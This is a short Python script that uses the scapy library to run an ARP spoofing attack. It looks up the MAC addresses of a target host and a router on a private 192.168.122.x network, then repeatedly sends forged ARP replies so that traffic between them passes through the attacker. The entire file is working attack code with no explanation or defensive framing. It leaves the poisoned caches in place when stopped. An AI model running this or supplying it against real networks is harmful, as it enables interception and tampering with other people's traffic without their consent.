import scapy.all as scapy
import sys
import time


def get_mac(address):
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_layer = scapy.ARP(pdst=address)
    packet = broadcast/arp_layer
    answer = scapy.srp(packet, timeout=2, verbose=False)[0]
    return answer[0][1].hwsrc

def spoof(target, router, target_mac,  router_mac):
    packet1 = scapy.ARP(op=2, hwdst=target_mac, pdst=target, psrc=router)
    packet2 = scapy.ARP(op=2, hwdst=router_mac, pdst=router, psrc=target)
    scapy.send(packet1)
    scapy.send(packet2)


target = '192.168.122.135'
router = '192.168.122.1'
target_mac = get_mac(target)
router_mac = get_mac(router)

try:
    while True:
        spoof(target, router, target_mac, router_mac)
        time.sleep(2)
except KeyboardInterrupt:
    print('Cancelling spoof...')
    sys.exit(0)
